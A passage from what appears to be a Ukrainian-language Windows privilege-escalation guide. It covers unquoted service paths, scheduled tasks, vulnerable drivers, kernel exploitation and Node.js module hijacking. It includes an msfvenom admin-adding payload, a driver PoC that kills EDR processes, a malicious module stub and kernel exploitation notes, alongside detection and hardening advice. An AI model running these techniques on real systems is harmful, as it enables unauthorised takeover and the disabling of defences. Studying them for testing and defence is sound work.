Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows намагатиметься виконати:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Перелічіть усі шляхи служб, не взяті в лапки, за винятком шляхів вбудованих служб Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Дії відновлення

Windows дозволяє користувачам указувати дії, які виконуватимуться в разі збою служби. Цю функцію можна налаштувати так, щоб вона запускала бінарний файл. Якщо цей файл можна замінити, може бути можливе підвищення привілеїв. Докладніше див. в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Цілі скриптів у запланованих завданнях

Для ввімкненого завдання, яке запускає `cmd.exe /c` із файлом `.bat` або `.cmd`, перевірте скрипт, указаний в **аргументах дії**, а також `cmd.exe`. Те саме стосується явного файлового аргументу інтерпретатора, наприклад PowerShell `-File`. Якщо запланований batch-файл містить буквальний виклик PowerShell `-File`, також перевірте ACL згаданого скрипту; змінні, умовні конструкції та ланцюжки команд оболонки потрібно відстежувати вручну. Можливість запису скрипту або батьківського каталогу для поточного облікового запису є зачіпкою для виконання коду з іншого облікового запису лише тоді, коли налаштований principal завдання відрізняється від облікового запису користувача, а завдання справді доходить до цієї дії. ACL лише для додавання даних може мати значення для скриптів, але попередній `exit` чи інша логіка керування потоком можуть зробити додані рядки недосяжними. Перш ніж заявляти про підвищення привілеїв, перевірте ефективні ACL, [контекст виконання завдання](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), робочий каталог, тригер і політику контролю програм. Під час інвентаризації не змінюйте скрипт і не запускайте завдання.

## Іменовані потоки в доступних файлах

У NTFS файл, доступний для читання, може мати іменований потік `:$DATA`, вміст якого не відображається у звичайному списку каталогів. Для невеликої, релевантної добірки доступних резервних копій або конфігураційних файлів спершу перевірте **назви й розміри** потоків, перш ніж відкривати будь-який вміст; Windows надає доступ до них через [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), а PowerShell — через [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Назва потоку, що натякає на секрет, — лише зачіпка. Перевірте ефективні права читання файлу, підтримку потоків файловою системою, чи містить потік придатні для використання облікові дані та до якого облікового запису вони справді дають змогу автентифікуватися. Під час звичайного переліку уникайте рекурсивного сканування потоків і виведення їхнього вмісту.

## Допоміжні вхідні файли Windows Driver Kit для запланованих завдань

До складу необов’язкового Windows Driver Kit входить `StandaloneRunner.exe`, який може використовувати файли `command.txt`, `reboot.rsf` і файл проєкту `working\rsf.rsf` зі свого робочого каталогу. Заплановане завдання або служба, що запускає цей допоміжний файл із привілейованим обліковим записом, може перетворити доступ на запис до цих вхідних файлів із низькими привілеями на виконання команд у контексті цього облікового запису, навіть якщо виконуваний файл допоміжної програми захищений. Переконайтеся, що споживач має привілеї та що **обидва** додаткові файли можна створювати або змінювати; самого виявлення допоміжної програми недостатньо.

Для запланованого завдання перевірте [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) його дії та ACL обох шляхів до додаткових файлів. Якщо завдання не задає робочий каталог, каталог виконуваного файлу — це лише зачіпка для перевірки, а не доказ того, звідки завдання читає вхідні файли. Також має бути виконана передумова щодо файлу проєкту. Перевірте фактичний principal завдання, а не припускайте, що воно запускається від імені SYSTEM.

## Застосунки

### Встановлені застосунки

Перевірте **дозволи для бінарних файлів** (можливо, один із них можна перезаписати й підвищити привілеї) та **каталогів** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Перевірка шляху відновлення агента Checkmk для Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) стосується старіших агентів Checkmk для Windows, які записували файли команд у `C:\Windows\Temp`, а потім запускали наявний файл, захищений від запису, якщо заміна не вдавалася. Постачальник виправив проблему у версіях 2.1.0p40, 2.2.0p23, 2.3.0b1 і 2.4.0b1. Перевірте повний рівень встановленого патча та можливість виконання відповідної операції агента; лише мітка гілки, наприклад `2.1`, не дає змоги визначити наявність уразливості. Під час переліку можна перевірити версію, стан служби та дозволи для Temp, не створюючи файлів і не запускаючи команди агента.

#### Перевірка служби SAML ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) стосувалася збірки ADSelfService Plus 6210 і попередніх; постачальник виправив її у збірці 6211. Уразливість має значення, лише якщо SAML SSO **увімкнено зараз або було ввімкнено раніше**. Тому запис про встановлений продукт або шлях до служби — це зачіпка, а не висновок про наявність уразливості: перевірте точну збірку, історію конфігурації SAML, мережеву доступність служби та обліковий запис, від імені якого вона працює. Виконання коду через службу відбувається з привілеями цього облікового запису; для виконання від імені SYSTEM екземпляр має працювати від імені SYSTEM. Доступний для читання файл `OfflineBackup_*.ezip` у каталозі Backup продукту — це окрема зачіпка щодо зашифрованої резервної копії, а не доказ наявності придатних облікових даних або цієї вади SAML. Під час звичайного переліку зафіксуйте його шлях і права доступу, не розпаковуючи файл.

#### Межі доступу контролера Jenkins і доменних облікових записів

На контролері Jenkins для Windows розрізняйте дозвіл створювати або налаштовувати завдання та дозвіл запускати його: [у документації Jenkins це окремі права `Job/Create`, `Job/Configure` і `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Налаштований розклад або віддалений тригер можуть надати інший спосіб запуску збірки, але перевірте, що він увімкнений і збірка справді запускається. Виконання відбувається від імені контролера або вибраного агента, а збережені облікові дані можна використати, лише якщо завдання має доступ до їхньої області дії. Окремо перевірте доступ до метаданих `JENKINS_HOME`: Jenkins зберігає дані облікових записів і ключі шифрування у файлах `credentials.xml`, `secrets/hudson.util.Secret` і `secrets/master.key` ([зберігання секретів Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Сам факт їхньої наявності не розкриває пароль; перевірте **доступ на читання до потрібних файлів** і наявність окремого шляху повторного використання облікового запису, не виводячи секрети у спільні журнали. Якщо цей обліковий запис має право запису до `scriptPath` об’єкта користувача AD, перевірте, що шлях доступний для запису, а також що є реальний вхід або запланований процес, який використовує цей шлях і працює від імені цільового користувача, перш ніж вважати це виконанням від імені іншого користувача. Для додаткового контролю груп необхідно окремо підтвердити ефективні права AD.

#### Ідентифікація агента Azure Pipelines із власним розміщенням

Для проєкту Azure DevOps Server або Azure Pipelines розрізняйте дозвіл **створювати або редагувати** конвеєр, дозвіл **ставити його в чергу** та дозвіл використовувати вибраний пул агентів; [Microsoft окремо описує дозволи конвеєрів](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) і [авторизацію пулу](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Якщо обліковий запис із нижчими привілеями може надіслати крок зі скриптом і запустити цей конвеєр на агенті Windows із власним розміщенням, крок виконається від імені [налаштованого для агента облікового запису операційної системи](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Перш ніж заявляти про перехід до іншого користувача або SYSTEM, перевірте конкретний конвеєр, обмеження для гілок і ресурсів, авторизований пул, завдання, яке можна запустити, та ідентифікатор облікового запису служби агента. Встановлений агент, роль у проєкті або доступ на запис до репозиторію самі по собі є лише зачіпками; під час пасивного переліку перевірте дозволи та локальні метадані служби, не запускаючи збірку.

#### Облікові дані Microsoft Entra Connect Sync

[Microsoft розрізняє](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **обліковий запис служби ADSync**, від імені якого працює служба синхронізації та який отримує доступ до її бази даних SQL, і **обліковий запис з’єднувача AD DS**, дозволи якого в каталозі залежать від налаштованих функцій синхронізації. Облікові дані з’єднувача зберігаються в цій базі даних у зашифрованому вигляді, а ключовий матеріал [захищено за допомогою DPAPI від імені облікового запису служби ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Сам факт наявності встановленої служби синхронізації, групи з назвою, що вказує на локальні права адміністратора, або доступу до бази даних не підтверджує, що облікові дані можна розшифрувати чи підвищити привілеї в домені. Окремо перевірте фактичні права читання бази даних, доступ до облікового запису служби та ключів, розташування інсталяції та SQL, налаштовану ідентичність з’єднувача й ефективні привілеї цієї ідентичності в AD. Під час звичайного переліку показуйте лише метадані служб і доступу, не запитуйте та не виводьте збережені секрети.

#### Дозволи для DLL підтримки драйвера принтера

Встановлений драйвер принтера може зберігати DLL підтримки в `C:\ProgramData` і завантажувати їх у привілейованому процесі друку. Перевірте ACL точного каталогу драйвера та DLL, зокрема батьківських каталогів і точок повторного розбору, навіть якщо перелік принтерів через WMI заборонений. Для [проблеми з драйвером принтера Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) вказаний шлях — `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [в оригінальному описі](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) описано завантаження DLL процесом `PrintIsolationHost.exe`. ACL із правом запису — лише зачіпка: перевірте ефективний доступ на запис з урахуванням записів заборони, чи встановлено відповідний драйвер і чи завантажує він файл із привілейованою ідентичністю, а також чи виправлено інсталяцію оновленим драйвером або програмою безпеки постачальника. Не робіть висновків про наявність уразливості лише за назвою каталогу або версією драйвера.

### Дозволи на запис

Перевірте, чи можете змінити якийсь файл конфігурації, щоб прочитати спеціальний файл, або змінити бінарний файл, який запускатиметься від імені облікового запису адміністратора (schedtasks).

Знайти папки або файли зі слабкими дозволами в системі можна так:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Автозавантаження плагінів Notepad++ для закріплення/виконання

Notepad++ автоматично завантажує будь-яку DLL плагіна з підпапок `plugins`. Якщо доступна портативна або скопійована інсталяція з правом запису, додавання шкідливого плагіна забезпечує автоматичне виконання коду в `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і callback-функцій плагінів).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час старту

**Перевірте, чи можете ви перезаписати реєстр або бінарний файл, який виконуватиме інший користувач.**\
**Прочитайте** **цю сторінку**, щоб дізнатися більше про цікаві **місця autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте можливі **сторонні дивні/вразливі** драйвери

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Якщо driver надає примітив довільного читання/запису ядра (поширене явище в погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши токен SYSTEM із пам’яті ядра.<sup>[[13]](#references)</sup> Покрокову техніку дивіться тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Пов’язані матеріали з експлуатації ядра Windows:

Приклад із ring-buffer у kernel-mode та доступними для запису з user space регістрами читання/запису дивіться у [варіанті з USB MIDI looped-streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Для помилок race condition, у яких вразливий виклик відкриває контрольований атакувальником шлях Object Manager, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків каталогів) може розтягнути вікно з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF у cancel-safe queue, витоки paged-pool і pivots через I/O ring

Деякі ланцюжки Windows kernel LPE можна побудувати на двох окремо слабких помилках: **гонці часу життя cancel-safe queue**, яка звільняє запит/CBD, поки блокування черги ще утримується, та витоку **після звільнення блокування, але до копіювання**, який розкриває звільнене виділення paged-pool під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Нотатки щодо аудиту та експлуатації:

- **Звільнення під блокуванням + подальше скасування**: шукайте шлях успішного виконання з послідовністю **Acquire -> CompleteRequest/free -> Release**, тоді як шлях скасування виконує **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо шлях успішного виконання доходить до `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`, перш ніж звільнити блокування CBDQ/CSQ, потік, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, згодом може продовжити виконання та передати звільнений `PFLT_CALLBACK_DATA` назад у callback-функцію видалення драйвера.
- **Повторно використайте звільнений об’єкт черги**, виділивши об’єкт paged-pool того самого розміру під контролем атакувальника. `NPFS` Data Queue Entries корисні, оскільки вміст і розмір можна контролювати, а згодом перевіряти за допомогою операцій читання/перегляду pipe. Якщо звільнений об’єкт містить вбудовані посилання списку, перезапишіть їх **циклічним списком фальшивих вузлів запитів у пам’яті user space**, щоб драйвер неодноразово обробляв визначені атакувальником структури запитів, а не зупинявся на початковій голові списку.
- **Перетворіть передбачуваний запис на потужніший примітив**: якщо фальшивий запит перенаправляє вкладений вказівник контексту, який використовується для записів облікових даних (міток часу / QPC / полів поруч із refcount), можна отримати запис у ядро з **контрольованою адресою, але неконтрольованим значенням**. У такому разі націльтеся на поле **довжини/розміру** об’єкта в sprayed pool, а не на кінцевий вказівник коду/даних, а потім переберіть об’єкти spray, доки пошкоджений об’єкт не забезпечить **читання paged-pool за межами буфера**.
- **Шаблон витоку, вразливий до race condition**: будь-який системний виклик із послідовністю `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` є перспективним кандидатом. Надійність підвищується, якщо атакувальник може збільшити буфер копіювання (наприклад, додавши багато записів списку/ресурсів, що збільшують кінцевий розмір виділення серіалізатора), оскільки довше копіювання розширює вікно для заміни, не обов’язково спричиняючи аварійне завершення роботи системи.
- **Цілі для повторного заповнення, насичені вказівниками**: масиви зареєстрованих буферів Windows **I/O ring** — чудові цілі для витоку, оскільки розмір їхнього paged-pool контролюється атакувальником (`8 * regBufferCnt`), а кожен елемент є вказівником ядра на `_IOP_MC_BUFFER_ENTRY`. Витікніть один із цих масивів, відновіть розташований поруч `IORING_OBJECT`, а потім пошкодьте **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні операції I/O ring використовували підроблені атакувальником записи та забезпечували довільне читання/запис ядра. Якщо доступний лише запис зі стабільним байтом (наприклад, зі `KUSER_SHARED_DATA+0x14`), використовуйте **накладені невирівняні записи**, щоб створити вказівник user space із повторюваним байтом, наприклад `0x0101010101010101`, відобразіть його через `VirtualAlloc` і розмістіть там підроблений масив зареєстрованих буферів.<sup>[[30]](#references)</sup>

Корисні ознаки для налагодження:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Щойно ви отримаєте довільне читання/запис у ядрі через пошкоджений I/O ring, викрадіть SYSTEM token, використовуючи стандартний процес після отримання примітива:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Примітиви пошкодження пам’яті реєстрового hive

Сучасні вразливості hive дають змогу формувати детерміновані розкладки, зловживати нащадками HKLM/HKU, доступними для запису, і перетворювати пошкодження метаданих на переповнення kernel paged-pool без спеціального драйвера. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Плутанина типів у режимі direct функції `RtlQueryRegistryValues` через контрольовані зловмисником шляхи

Деякі драйвери приймають шлях до реєстру з userland, перевіряють лише, що це коректний рядок UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` з `RTL_QUERY_REGISTRY_DIRECT`, передаючи вказівник на скалярну змінну в стеку, наприклад `int readValue`. Якщо відсутній `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` інтерпретується відповідно до **фактичного** типу реєстру, а не того, якого очікував розробник.

Це створює два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>

- **Плутанина довіреної сторони / oracle**: контрольований користувачем абсолютний шлях `\Registry\...` дає драйверу змогу запитувати вибрані зловмисником ключі, розкривати їхню наявність через коди повернення/журнали, а іноді й читати значення, до яких викликач не мав би прямого доступу.
- **Пошкодження пам’яті ядра**: призначення для скалярного значення, наприклад `&readValue`, може бути інтерпретоване з плутаниною типів як `REG_QWORD`, `UNICODE_STRING` або буфер бінарних даних із заданим розміром — залежно від типу значення реєстру.

Практичні нотатки щодо експлуатації:

- **Захист у Windows 8+**: якщо запит звертається до **недовіреного hive** із `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, виклики з ядра призводять до аварійного завершення з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти можливість експлуатації, шукайте **ключі, доступні зловмиснику для запису, у довірених системних hive**, а не розміщуйте значення в `HKCU`.
- **Підготовка в довіреному hive**: використовуйте NtObjectManager, щоб перелічити нащадки `\Registry\Machine`, доступні для запису, а потім повторно виконайте сканування з дублікатом токена **з низьким рівнем цілісності**, щоб знайти ключі, доступні з контекстів пісочниці:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує сусідні дані стека й може частково перезаписати вказівник на callback/функцію поблизу.
- **`REG_SZ` / `REG_EXPAND_SZ`**: у прямому режимі `EntryContext` має вказувати на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований зловмисником `REG_DWORD` у скаляр на стеку, а потім повторно використовує той самий буфер для читання рядка, зловмисник контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, що дає напівконтрольований запис у kernel.
- **`REG_BINARY`**: для великих бінарних даних прямий режим трактує перший `LONG` за адресою `EntryContext` як розмір буфера зі знаком. Якщо попереднє читання `REG_DWORD` залишає в повторно використаному скалярі контрольоване зловмисником **від’ємне** значення, наступний запит `REG_BINARY` копіює байти зловмисника безпосередньо в сусідні слоти стека. Це часто найпростіший шлях до повного перезапису вказівника callback.

Типовий шаблон для пошуку: **різнотипні читання реєстру в ту саму змінну на стеку без її повторної ініціалізації**. Виконуйте пошук за `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використаними вказівниками `EntryContext` і шляхами коду, де перше читання реєстру визначає, чи відбудеться друге.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN в об’єктах пристроїв (LPE + знищення EDR)

Деякі підписані драйвери сторонніх розробників створюють об’єкт пристрою з надійним SDDL через IoCreateDeviceSecure, але забувають встановити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривають за шляхом із додатковим компонентом. У результаті будь-який непривілейований користувач може отримати дескриптор, використавши шлях простору імен на кшталт:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Отримавши змогу відкрити пристрій, користувач може зловживати привілейованими IOCTL, які надає драйвер, для LPE і втручання в роботу системи. У реальних випадках спостерігалися такі можливості:
- Повернення дескрипторів із повним доступом до довільних процесів (крадіжка токена / оболонка SYSTEM через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене читання/запис raw-диска (втручання в систему офлайн, трюки зі збереженням доступу під час завантаження).
- Завершення довільних процесів, зокрема Protected Process/Light (PP/PPL), що дає змогу з user land знищувати AV/EDR через kernel.

Мінімальний шаблон PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Заходи для розробників
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, доступ до яких має обмежуватися DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом завершення процесу або повернення дескрипторів.
- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розгляньте моделі з broker замість прямих привілеїв ядра.

Ідеї для виявлення зловмисної активності
- Відстежуйте відкриття з user mode підозрілих імен пристроїв (наприклад, \\ .\\amsdk*) і певні послідовності IOCTL, що вказують на зловживання.
- Застосовуйте список заблокованих уразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) і підтримуйте власні списки дозволених і заблокованих драйверів.


## PATH DLL Hijacking

Якщо у вас є **дозвіл на запис у папку, що міститься в PATH**, ви можете перехопити DLL, завантажувану процесом, і **підвищити привілеї**.<sup>[[2]](#references)</sup>

Перевірте дозволи для всіх папок у PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Щоб дізнатися більше про те, як зловживати цією перевіркою:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв’язання модулів Node.js / Electron через `C:\node_modules`

Це варіант **неконтрольованого шляху пошуку у Windows**, який впливає на програми **Node.js** і **Electron**, коли вони виконують bare import, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>

Node шукає пакети, рухаючись угору деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може дійти до кореня диска, тому програма, запущена з `C:\Users\Administrator\project\app.js`, може перевірити такі шляхи:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити там шкідливий `foo.js` (або папку пакета) і чекати, поки **процес Node/Electron із вищими привілеями** спробує знайти відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тож це стає **LPE**, якщо цільова програма запускається від імені адміністратора, із підвищеними привілеями через заплановане завдання чи обгортку служби або як привілейована програма робочого столу з автозапуском.

Це особливо поширено, коли:

- залежність указана в `optionalDependencies`<sup>[[22]](#references)</sup>
- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу після помилки
- пакет видалили зі збірок для production, не включили під час пакування або не вдалося встановити
- вразливий `require()` розташований глибоко в дереві залежностей, а не в коді основної програми

### Пошук вразливих цілей

Використовуйте **Procmon**, щоб підтвердити шлях пошуку:<sup>[[23]](#references)</sup>

- Фільтр `Process Name` = виконуваний файл цільової програми (`node.exe`, EXE-файл програми Electron або процес-обгортка)
- Фільтр `Path` `contains` `node_modules`
- Зверніть увагу на `NAME NOT FOUND` і останнє успішне відкриття у `C:\node_modules`

Корисні шаблони для аналізу коду в розпакованих файлах `.asar` або вихідному коді програми:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневий каталог пошуку, якщо його ще не існує:

```powershell
mkdir C:\node_modules
```

3. Розмістіть модуль із точно очікуваною назвою:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Запустіть застосунок-жертву. Якщо застосунок спробує виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх необов’язкових модулів, які відповідають цьому шаблону, — `bluebird` і `utf-8-validate`. Але **техніка** є універсальною: знайдіть будь-який **відсутній bare import**, який привілейований процес Node/Electron у Windows спробує вирішити.

### Ідеї для виявлення та посилення захисту

- Створіть сповіщення про створення користувачем `C:\node_modules` або запис нових файлів чи пакетів `.js` у цю теку.
- Відстежуйте процеси з високим рівнем цілісності, які читають файли з `C:\node_modules\*`.
- Додавайте всі залежності середовища виконання до production-збірок і перевіряйте використання `optionalDependencies`.
- Перевіряйте код сторонніх розробників на наявність шаблонів `try { require("...") } catch {}`, які не виводять помилок.
- Вимикайте необов’язкові перевірки, якщо бібліотека це підтримує (наприклад, деякі конфігурації `ws` дають змогу уникнути застарілої перевірки `utf-8-validate` за допомогою `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### файл hosts

Перевірте, чи немає у файлі hosts жорстко прописаних інших відомих комп’ютерів.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Мережеві інтерфейси та DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Відкриті порти

Перевірте **обмежені служби** ззовні

```bash
netstat -ano #Opened ports?
```

Для локального listener зіставте його PID із власником процесу, шляхом до виконуваного файла та будь-якою службою або запланованим завданням, що його запускає. Служба віддаленого керування може надати доступ із правами свого користувача лише за умови, що це дозволяють її автентифікація та засоби керування командами. Власний TCP-застосунок, що працює від облікового запису з вищими привілеями, — це окрема ціль для перевірки: listener і шлях до бінарного файла є лише пасивними зачіпками, тоді як для використання вразливості пошкодження пам’яті через автентифікований канал потрібно проаналізувати саме цей бінарний файл і доступні для нього вхідні дані. Якщо здається, що відкритий порт належить системному процесу, перш ніж визначати службу на кінцевому вузлі, порівняйте його з [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface); саме правило переспрямування не доводить, що кінцевий вузол доступний або вразливий.

### Таблиця маршрутизації

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Таблиця ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Правила брандмауера

[**Перегляньте цю сторінку зі командами для роботи з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд списку правил, створення правил, вимкнення, вимкнення...)**

Більше[ команд для перерахування мережі тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

